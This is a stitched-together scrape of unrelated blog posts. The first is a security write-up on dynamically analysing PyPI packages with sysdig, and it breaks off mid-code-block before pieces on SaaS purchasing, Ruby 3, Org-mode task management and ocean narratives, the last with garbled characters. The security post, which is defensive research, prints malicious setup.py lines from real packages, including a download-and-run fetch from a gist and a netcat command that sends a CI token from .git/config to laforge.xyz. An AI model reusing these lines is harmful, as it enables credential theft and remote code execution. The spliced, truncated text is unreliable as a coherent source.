About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>

    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>

<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>

	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
<p>I use as few TODO keywords as possible but not too few. For example, it is common to use only two states (“TODO” and “DONE”) but this does not align with the principles I mentioned above. I need a state for “open loops” so that I can keep the number of them small. I also need to distinguish a smaller set of “next actions” from all tasks.</p>
<p>So far, I defined these five keywords:</p>
<table>
<thead>
<tr>
<th>TODO Keyword</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TODO</code></td>
<td><strong>Tasks that are not started and not planned.</strong> They could be the backlogs or the GTD’s someday/maybe. These tasks could be converted to <code>NEXT</code> during a review.</td>
</tr>
<tr>
<td><code>NEXT</code></td>
<td><strong>Tasks that are not started but planned to do as soon as I can.</strong>  When there is no actionable <code>PROG</code> (e.g., blocked), I start one of those and convert it to <code>PROG</code>.</td>
</tr>
<tr>
<td><code>PROG</code></td>
<td><strong>Tasks that are working in progress (open loops).</strong> I work on these tasks before starting another <code>NEXT</code> task to avoid too many open loops at any moment.</td>
</tr>
<tr>
<td><code>INTR</code></td>
<td><strong>The tasks that are interruptions.</strong> They are urgent things that I should drop everything else and work on it. For example, production issues.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><strong>The tasks that are completed.</strong></td>
</tr>
</tbody>
</table>
<p>This diagram illustrates the transition of those states.</p>
<pre><code>                                 +------+
                                 | INTR |
                                 +------+
                                    |
                                    v
+------+   +------+   +------+   +------+
| TODO |--&gt;| NEXT |--&gt;| PROG |--&gt;| DONE |
+------+   +------+   +------+   +------+
</code></pre><h3 id="22-scheduled-and-deadline">2.2 Scheduled and Deadline</h3>
<p>In the past, I tended to set a date for all tasks. If I want to do A, B, and C on Monday, then I schedule them for Monday. This sounds very intuitive but, in reality, I ended up rescheduling many incompleted tasks at the end of every day. It was not only wasting time but also depressing.</p>
<p>Later, I changed to rely more on the TODO keywords. For example, if a task is still in progress, I keep the state unchanged as <code>PROG</code> instead of rescheduling it every day until it is done. I am now using the “scheduled date” to hide a task until the date I should look at it again. Similar to the snooze feature in Gmail.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SCHEDULED</code></td>
<td>Hide the task until the scheduled date.</td>
</tr>
<tr>
<td><code>DEADLINE</code></td>
<td>The deadline of the task.</td>
</tr>
</tbody>
</table>
<p>For example, when a <code>PROG</code> task is being blocked, I set the <code>SCHEDULED</code> date to hide it until the date I want to revisit. On the scheduled date, if the task is unblocked, I will remove the <code>SCHEDULED</code> date. If the task is still blocked, I reschedule it again. It acts as the <a href="https://hamberg.no/gtd#the-waiting-for-list">waiting for list</a> in GTD.</p>
<h2 id="3-the-workflow">3 The Workflow</h2>
<p>I customize my org agenda view to drive my daily workflow. The customized agenda view has four sections. From the top to bottom, they are the tasks scheduled today, the <code>INTR</code> tasks, the <code>PROG</code> tasks, and finally the <code>NEXT</code> tasks.</p>
<p><img src="https://whhone.com/img/org-agenda.png" alt="Org Agenda"></p>
<p>My daily workflow goes from the top to the bottom.</p>
<h3 id="31-update-tasks-scheduled-today">3.1 Update Tasks Scheduled Today</h3>
<p>At the beginning of the day, I review the tasks that are scheduled for today. The goal here is not to finish them, but to update or remove the scheduled date so that there is nothing left.</p>
<ol>
<li>If the task is still blocked, reschedule it</li>
<li>If the task could be done in a few minutes, then do it and mark it as <code>DONE</code>.</li>
<li>Otherwise, remove the scheduled date and optionally update the TODO keywords.</li>
</ol>
<p>Removing the scheduled date is the best outcome. It indicates the previous estimation was correct, at least not too early. Rescheduling indicates the previous estimation is inaccurate. I would avoid rescheduling the task to tomorrow indiscriminately and try to make a good estimation to reduce the number of rescheduling.</p>
<h3 id="32-find-the-next-task-to-work-on">3.2 Find the Next Task to Work On</h3>
<p>After reviewing all tasks scheduled for today, it is time to pick a task and do some real works. This step is very straight-forward with the customized agenda view above.</p>
<ol>
<li>Pick an <code>INTR</code> task if there is any.</li>
<li>If there is no <code>INTR</code> task, then pick a <code>PROG</code> task and work on it. If that task is blocked, set a <code>SCHEDULED</code> date to hide it.</li>
<li>If there is no <code>INTR</code> and <code>PROG</code> task, then start a <code>NEXT</code> task.</li>
<li>If there is no task in the agenda view, then review the <code>TODO</code> tasks and convert some to <code>NEXT</code>.</li>
</ol>
<h3 id="33-review-the-system">3.3 Review the System</h3>
<p>The secret of having a system that works in the long-term is regular maintenance. I do it at least once a week. For examples,</p>
<ul>
<li>Promote some tasks from <code>TODO</code> to <code>NEXT</code>. Demote or even delete deprioritized tasks.</li>
<li>Review the <a href="https://whhone.com/posts/daily-journal/">journal</a> and add <code>TODO</code> if something needs follow-up.</li>
<li><a href="https://orgmode.org/manual/Archiving.html">Archive</a> completed tasks and extract to permanent notes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
</ul>
<h2 id="4-the-configuration">4 The Configuration</h2>
<p>Finally, here is the configuration for the above workflow.</p>
<div><pre><code data-lang="lisp"><span>;; Emacs Easy Customization ("M-x customize") syntax is used.</span>
<span>;; If you prefer using .el files directly, set it with "setq".</span>

<span>;; TODO keywords.</span>
<span>'</span>(org-todo-keywords
  <span>'</span>((<span>sequence</span> <span>"TODO(t)"</span> <span>"NEXT(n)"</span> <span>"PROG(p)"</span> <span>"INTR(i)"</span> <span>"DONE(d)"</span>)))

<span>;; Show the daily agenda by default.</span>
<span>'</span>(org-agenda-span <span>'day</span>)

<span>;; Hide tasks that are scheduled in the future.</span>
<span>'</span>(org-agenda-todo-ignore-scheduled <span>'future</span>)

<span>;; Use "second" instead of "day" for time comparison.</span>
<span>;; It hides tasks with a scheduled time like "&lt;2020-11-15 Sun 11:30&gt;"</span>
<span>'</span>(org-agenda-todo-ignore-time-comparison-use-seconds <span>t</span>)

<span>;; Hide the deadline prewarning prior to scheduled date.</span>
<span>'</span>(org-agenda-skip-deadline-prewarning-if-scheduled <span>'pre-scheduled</span>)

<span>;; Customized view for the daily workflow. (Command: "C-c a n")</span>
<span>'</span>(org-agenda-custom-commands
  <span>'</span>((<span>"n"</span> <span>"Agenda / INTR / PROG / NEXT"</span>
     ((agenda <span>""</span> <span>nil</span>)
      (todo <span>"INTR"</span> <span>nil</span>)
      (todo <span>"PROG"</span> <span>nil</span>)
      (todo <span>"NEXT"</span> <span>nil</span>))

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>D</span>eclarations that the ocean is dying have become commonplace. We read headlines almost daily telling us that the oceans are choked with plastic, overfished, and rapidly acidifying. Yet even in â€œdying,â€� we are told, the ocean threatens human existence as sea levels rise, sea surface temperatures increase, and commercial fish stocks disappear.&nbsp;</p><p>The ocean has thus become emblematic both of a natural world victimized by humanity and of natureâ€™s possible vengeance. In a 2014 video by the nonprofit organization Conservation International, the growling baritone of the actor Harrison Ford speaks for the ocean: â€œI give. They take. But I can always take back.â€�&nbsp; The message is powerful because it conjures images of both the primordial sea as crucible of life and the biblical flood—destruction of life as punishment for human sin. Yet a vengeful ocean is but one of several historical depictions of the sea, some of which have gained prominence at particular moments while others have faded away. In the 1960s and 1970s many scientists, engineers, and policy makers approached the ocean as a vast but resistant reservoir of untapped natural resources. The hostility of the ocean was understood in the context of national calls for increasing exploitation. US Rear Admiral William C. Hushing, for example, in 1967 described the ocean as â€œhostile in almost every way you can think.â€� In Hushingâ€™s view, the task set for â€œManâ€� was â€œto train himself for the hostilityâ€� and eventually â€œfind ways to convert the hostility to friendliness.â€�&nbsp;</p>
<p>Today, the ocean is increasingly cast as fragile, even as dying. And while the ocean voiced by Harrison Ford remains threatening, the message is that humans are responsible for that threat. We, not the ocean, have taken too much. Once we recognize the increasing dominance of a conception of the ocean as fragile and dying, we are prompted to ask how this shapes conservation efforts and whether it has a net positive or negative influence on marine environmental protection. In the fall of 2016, for example, <em>Outside Magazine </em>published an obituary for the Great Barrier Reef. The article quickly went viral, but coral reef scientists condemned the story as irresponsible. The Great Barrier Reef, they pointed out, although under severe threat, was not yet dead. To declare it lifeless was to give up hope. Environmental pessimism comes at a cost. When pseudoscientific claims gain traction, it is often because they appeal to emotions and long-standing narratives already associated with particular environmental spaces.</p>
<p>Dying-seas narratives and imagery may actually hamper communication between scientists and the public. As an example, Jay Cullen, a researcher at the University of Victoria, leads a project to monitor Fukushima radiation in the eastern Pacific. When Cullenâ€™s lab reported that trace radiation was present off the coast of British Columbia but did not represent a significant health hazard, the response was vociferously angry, including death threats aimed at Cullen. In the case of the Fukushima radiation reports, one publicâ€™s response was to reject scientific claims that did not support the narrative of threatening â€œdying seas.â€� To quote the <em>Globe and Mail: </em>â€œDr. Cullen said he frequently hears from people that his science simply canâ€™t be right because the Pacific Ocean is dying. It is adrift with tsunami debris and plastic waste and its stocks have been overfished, but it has not been killed by nuclear radiation.â€�</p>
<blockquote>Hope, like fear, has power to shape the world we will inhabit.</blockquote>
